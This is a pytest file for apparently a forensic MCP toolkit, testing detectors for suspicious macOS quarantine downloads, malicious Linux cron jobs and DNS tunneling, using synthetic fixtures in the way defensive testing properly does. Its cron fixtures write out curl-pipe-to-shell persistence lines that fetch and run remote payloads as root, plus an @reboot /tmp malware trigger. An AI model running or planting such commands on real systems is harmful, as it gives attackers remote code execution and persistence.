"""
Tests for v0.6.1 macOS quarantine + Linux cron + DNS tunneling MCP functions.

All tests use temp filesystems / synthesized log fixtures. No network, no real
exploit payloads, no privileged file access. EVIDENCE_ROOT is rebound to a
per-test tmp_path via autouse fixture, matching the pattern in test_v05_*.
"""
import os
import sqlite3
import sys
from pathlib import Path

import pytest

SRC = Path(__file__).resolve().parents[1] / "dart_mcp" / "src"
sys.path.insert(0, str(SRC))

import dart_mcp  # noqa: E402
from dart_mcp import call_tool, list_tools  # noqa: E402


@pytest.fixture(autouse=True)
def _bind_evidence_root_to_tmp(tmp_path, monkeypatch):
    monkeypatch.setattr(dart_mcp, "EVIDENCE_ROOT", tmp_path)
    yield


# =============================================================================
# Surface registration
# =============================================================================

def test_v06_functions_are_registered():
    names = {t["name"] for t in list_tools()}
    expected = {
        "parse_macos_quarantine",
        "parse_linux_cron_jobs",
        "detect_dns_tunneling",
    }
    missing = expected - names
    assert not missing, f"v0.6.1 functions missing from surface: {missing}"


# =============================================================================
# parse_macos_quarantine
# =============================================================================

def _build_quarantine_db(path: Path, rows: list[dict]):
    """Create a minimal LSQuarantineEvent SQLite DB for fixture purposes."""
    conn = sqlite3.connect(path)
    conn.execute("""
        CREATE TABLE LSQuarantineEvent (
            LSQuarantineEventIdentifier TEXT PRIMARY KEY,
            LSQuarantineTimeStamp REAL,
            LSQuarantineAgentBundleIdentifier TEXT,
            LSQuarantineAgentName TEXT,
            LSQuarantineDataURLString TEXT,
            LSQuarantineOriginURLString TEXT,
            LSQuarantineSenderName TEXT,
            LSQuarantineTypeNumber INTEGER
        )
    """)
    for r in rows:
        conn.execute(
            "INSERT INTO LSQuarantineEvent VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (r.get("id", "uuid-x"), r.get("ts", 770_000_000.0),
             r.get("bundle", ""), r.get("agent_name", ""),
             r.get("data_url", ""), r.get("origin_url", ""),
             r.get("sender_name", ""), r.get("type_number", 0)),
        )
    conn.commit()
    conn.close()


def test_parse_macos_quarantine_browser_download_no_flags(tmp_path):
    db = tmp_path / "QuarantineV2.sqlite"
    _build_quarantine_db(db, [{
        "id": "uuid-1",
        "ts": 770_000_000.0,  # 2025-05-04 ish
        "bundle": "com.apple.Safari",
        "agent_name": "Safari",
        "data_url": "https://example.com/document.pdf",
        "origin_url": "https://example.com/",
        "sender_name": "example.com",
    }])
    out = call_tool("parse_macos_quarantine", {"quarantine_db_path": str(db)})
    assert out["total"] == 1
    assert out["flagged_count"] == 0
    assert out["events"][0]["flags"] == []
    assert out["events"][0]["agent_bundle_id"] == "com.apple.Safari"


def test_parse_macos_quarantine_flags_non_browser_and_pastebin(tmp_path):
    db = tmp_path / "QuarantineV2.sqlite"
    _build_quarantine_db(db, [{
        "id": "uuid-2",
        "ts": 780_000_000.0,
        "bundle": "com.suspicious.tool",
        "agent_name": "SuspiciousTool",
        "data_url": "https://pastebin.com/raw/abc123",
        "origin_url": "https://pastebin.com/abc123",
        "sender_name": "pastebin.com",
    }])
    out = call_tool("parse_macos_quarantine", {"quarantine_db_path": str(db)})
    assert out["total"] == 1
    flags = out["events"][0]["flags"]
    assert "non_browser_downloader" in flags
    assert "pastesite_origin" in flags


def test_parse_macos_quarantine_flags_raw_ip_origin(tmp_path):
    db = tmp_path / "QuarantineV2.sqlite"
    _build_quarantine_db(db, [{
        "id": "uuid-3",
        "ts": 790_000_000.0,
        "bundle": "com.apple.Safari",
        "agent_name": "Safari",
        "data_url": "http://203.0.113.42/payload.dmg",
        "origin_url": "http://203.0.113.42/",
    }])
    out = call_tool("parse_macos_quarantine", {"quarantine_db_path": str(db)})
    flags = out["events"][0]["flags"]
    assert "raw_ip_origin" in flags
    assert "archive_download" in flags  # .dmg


def test_parse_macos_quarantine_flagged_only_filter(tmp_path):
    db = tmp_path / "QuarantineV2.sqlite"
    _build_quarantine_db(db, [
        {"id": "u-1", "ts": 770_000_000.0, "bundle": "com.apple.Safari",
         "data_url": "https://example.com/doc.pdf", "origin_url": "https://example.com/"},
        {"id": "u-2", "ts": 770_000_001.0, "bundle": "com.shady.app",
         "data_url": "https://pastebin.com/raw/xx",
         "origin_url": "https://pastebin.com/xx"},
    ])
    all_out = call_tool("parse_macos_quarantine", {"quarantine_db_path": str(db)})
    assert all_out["total"] == 2

    flagged_out = call_tool("parse_macos_quarantine", {
        "quarantine_db_path": str(db),
        "flagged_only": True,
    })
    assert flagged_out["total"] == 1
    assert flagged_out["events"][0]["event_id"] == "u-2"


def test_parse_macos_quarantine_missing_file_returns_error(tmp_path):
    out = call_tool("parse_macos_quarantine", {
        "quarantine_db_path": str(tmp_path / "nope.sqlite"),
    })
    assert out["total"] == 0
    assert "error" in out


# =============================================================================
# parse_linux_cron_jobs
# =============================================================================

def test_parse_linux_cron_clean_crontab(tmp_path):
    # build a fake evidence root with /etc/crontab
    etc = tmp_path / "etc"
    etc.mkdir()
    (etc / "crontab").write_text(
        "# m h dom mon dow user command\n"
        "0 3 * * * root /usr/bin/logrotate /etc/logrotate.conf\n"
    )
    out = call_tool("parse_linux_cron_jobs", {"evidence_root": str(tmp_path)})
    assert out["total"] == 1
    assert out["flagged_count"] == 0
    assert out["jobs"][0]["user"] == "root"
    assert "logrotate" in out["jobs"][0]["command"]


def test_parse_linux_cron_flags_curl_pipe_bash(tmp_path):
    etc = tmp_path / "etc"
    etc.mkdir()
    (etc / "crontab").write_text(
        "*/5 * * * * root curl https://203.0.113.5/payload | bash\n"
    )
    out = call_tool("parse_linux_cron_jobs", {"evidence_root": str(tmp_path)})
    assert out["flagged_count"] == 1
    flags = out["jobs"][0]["flags"]
    assert "curl_pipe_shell" in flags
    assert "raw_ip_url" in flags


def test_parse_linux_cron_flags_reboot_trigger(tmp_path):
    spool = tmp_path / "var" / "spool" / "cron"
    spool.mkdir(parents=True)
    (spool / "root").write_text(
        "@reboot /tmp/.malware.sh\n"
    )
    out = call_tool("parse_linux_cron_jobs", {"evidence_root": str(tmp_path)})
    assert out["flagged_count"] >= 1
    flags = out["jobs"][0]["flags"]
    assert "reboot_trigger" in flags
    assert "tmp_script" in flags


def test_parse_linux_cron_flagged_only_filter(tmp_path):
    etc = tmp_path / "etc"
    etc.mkdir()
    (etc / "crontab").write_text(
        "0 3 * * * root /usr/bin/logrotate /etc/logrotate.conf\n"
        "*/5 * * * * root curl https://1.2.3.4/x | sh\n"
    )
    all_out = call_tool("parse_linux_cron_jobs", {"evidence_root": str(tmp_path)})
    assert all_out["total"] == 2

    flagged_out = call_tool("parse_linux_cron_jobs", {
        "evidence_root": str(tmp_path),
        "flagged_only": True,
    })
    assert flagged_out["total"] == 1
    assert "curl_pipe_shell" in flagged_out["jobs"][0]["flags"]


def test_parse_linux_cron_empty_evidence_root_returns_nothing(tmp_path):
    out = call_tool("parse_linux_cron_jobs", {"evidence_root": str(tmp_path)})
    assert out["total"] == 0
    assert out["flagged_count"] == 0


# =============================================================================
# detect_dns_tunneling
# =============================================================================

def test_detect_dns_tunneling_clean_log(tmp_path):
    log = tmp_path / "query.log"
    log.write_text(
        "14-May-2026 10:23:45.123 client 10.0.0.1#54321 (example.com): query: example.com IN A +E(0)K (10.0.0.2)\n"
        "14-May-2026 10:23:46.111 client 10.0.0.1#54322 (google.com): query: google.com IN A +E(0)K (10.0.0.2)\n"
    )
    out = call_tool("detect_dns_tunneling", {"dns_log_path": str(log)})
    assert out["total_queries_parsed"] == 2
    assert out["total_flagged"] == 0


def test_detect_dns_tunneling_flags_high_entropy_subdomain(tmp_path):
    log = tmp_path / "query.log"
    # high-entropy base64-style label (mixed case + digits, no patterns)
    # entropy ~5.5+, well above default threshold 3.8
    high_ent_label = "aB3xQ7zK9mP2wR5sT8vL1jH4nE6dY0gF"
    log.write_text(
        f"14-May-2026 10:23:45.123 client 10.0.0.1#54321 ({high_ent_label}.evil.com): "
        f"query: {high_ent_label}.evil.com IN TXT +E(0)K (10.0.0.2)\n"
    )
    out = call_tool("detect_dns_tunneling", {"dns_log_path": str(log)})
    assert out["total_flagged"] >= 1
    flags = out["flagged_queries"][0]["flags"]
    assert "high_entropy_label" in flags
    assert "rare_qtype_TXT" in flags


def test_detect_dns_tunneling_flags_long_label(tmp_path):
    log = tmp_path / "query.log"
    long_label = "a" * 55  # > 50 char threshold but low entropy
    log.write_text(
        f"14-May-2026 10:23:45.123 client 10.0.0.1#54321 ({long_label}.example.com): "
        f"query: {long_label}.example.com IN A +E(0)K (10.0.0.2)\n"
    )
    out = call_tool("detect_dns_tunneling", {"dns_log_path": str(log)})
    assert out["total_flagged"] >= 1
    flags = out["flagged_queries"][0]["flags"]
    assert "long_label" in flags


def test_detect_dns_tunneling_high_volume_detection(tmp_path):
    log = tmp_path / "query.log"
    # 60 queries to the same parent — above volume_threshold default 50
    lines = []
    for i in range(60):
        lines.append(
            f"14-May-2026 10:23:{i:02d}.123 client 10.0.0.1#54321 (q{i}.tunnel.evil.com): "
            f"query: q{i}.tunnel.evil.com IN A +E(0)K (10.0.0.2)"
        )
    log.write_text("\n".join(lines))
    out = call_tool("detect_dns_tunneling", {"dns_log_path": str(log)})
    high_volume = out["high_volume_domains"]
    assert any(d["parent_domain"] == "evil.com" and d["query_count"] >= 50 for d in high_volume)


def test_detect_dns_tunneling_dnscat2_signature(tmp_path):
    log = tmp_path / "query.log"
    log.write_text(
        "14-May-2026 10:23:45.123 client 10.0.0.1#54321 (dnscat.attacker.com): "
        "query: dnscat.attacker.com IN CNAME +E(0)K (10.0.0.2)\n"
    )
    out = call_tool("detect_dns_tunneling", {"dns_log_path": str(log)})
    assert out["total_flagged"] >= 1
    flags = out["flagged_queries"][0]["flags"]
    assert "dnscat2_signature" in flags


def test_detect_dns_tunneling_missing_file_returns_error(tmp_path):
    out = call_tool("detect_dns_tunneling", {
        "dns_log_path": str(tmp_path / "nope.log"),
    })
    assert out["total_flagged"] == 0
    assert "error" in out
